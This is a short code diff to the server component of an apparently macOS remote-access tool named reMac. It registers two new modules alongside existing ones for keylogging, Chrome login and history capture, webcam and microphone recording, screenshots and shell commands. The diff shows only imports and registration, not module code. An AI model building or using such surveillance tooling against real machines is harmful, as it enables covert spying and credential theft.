@@ -3,6 +3,7 @@ import sys
 from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins, mod_chrome_history
 from apps.server.modules import mod_shellcmd, mod_screenshot, mod_webcam, mod_recmic, mod_modHelp, mod_info
 from apps.server.modules import mod_download, mod_upload, mod_help, mod_video, mod_system_profiler, mod_webload
+from apps.server.modules import mod_webupload, mod_args
 
 from apps.libs.reMac_libbase import reMac_libbase
 
@@ -23,8 +24,11 @@ reMacModules = [
     mod_video.mod_video(),
     mod_help.mod_help(),
     mod_system_profiler.mod_system_profiler(),
-    mod_webload.mod_webload()
+    mod_webload.mod_webload(),
+    mod_webupload.mod_webupload(),
+    mod_args.mod_args()
 ]
+
 
 class reMac_libserver(reMac_libbase):
     def __init__(self, selector, sock, addr):
